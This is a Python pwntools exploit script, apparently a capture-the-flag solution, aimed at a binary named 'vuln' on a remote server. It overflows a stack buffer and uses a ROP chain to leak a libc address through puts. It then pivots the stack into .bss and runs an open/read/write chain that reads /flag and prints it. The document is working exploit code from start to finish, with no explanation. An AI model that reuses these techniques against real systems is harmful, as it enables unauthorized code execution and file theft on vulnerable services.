from pwn import *

io = remote("47.100.137.175", 32120)
context(os="linux", arch="amd64", log_level="debug")
elf = ELF('./vuln')
libc = ELF('./libc.so.6')

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]
pop_rdi = 0x00000000004013e3
ret = 0x000000000040101a
pop_rsi_r15_ret = 0x00000000004013e1
leave_ret = 0x0000000000401290

payload = b'a' * (0x100 + 8) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(elf.sym["main"])
io.recvuntil(b"accord")
io.sendline(payload)
# io.recvline()
# io.recvline()
libc_base = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
print(hex(libc_base))
system = libc_base + libc.sym["system"]
binsh = libc_base + 0x1B45BD
pop_rdx = libc_base + 0x0000000000142c92
pop_rsi = libc_base + 0x000000000002601f

bss = 0x404160

payload1 = b'a' * 0x100 + p64(bss + 0x100)  # fake_ebp1
# read(0, bss + 0x100, 0x130)
payload1 += p64(pop_rsi) + p64(bss + 0x100)  # rdi和rdx用他最后留下的0和0x130
payload1 += p64(elf.plt['read'])
payload1 += p64(leave_ret)
payload1 += p64(bss + 0x200)  # fake_ebp
print(hex(len(payload1)))
io.recvuntil(b'accord')
io.send(payload1)

# open('./flag.txt', 0)
payload1 = b'/flag\x00\x00\x00'
payload1 += p64(pop_rdi) + p64(bss + 0x100)  # ./flag.txt\x00 的地址
payload1 += p64(pop_rsi) + p64(0)
payload1 += p64(libc_base + libc.sym['open'])

# read(3, bss + 0x200, 0x20)
payload1 += p64(pop_rdi) + p64(3)
payload1 += p64(pop_rsi) + p64(bss + 0x200)
payload1 += p64(pop_rdx) + p64(0x120)
payload1 += p64(libc_base + libc.sym['read'])

# write(1, bss + 0x200, 0x20)
payload1 += p64(pop_rdi) + p64(1)
payload1 += p64(pop_rsi) + p64(bss + 0x200)
payload1 += p64(pop_rdx) + p64(0x120)
payload1 += p64(libc_base + libc.sym['write'])
payload1 += p64(elf.sym["main"])
io.send(payload1)

io.interactive()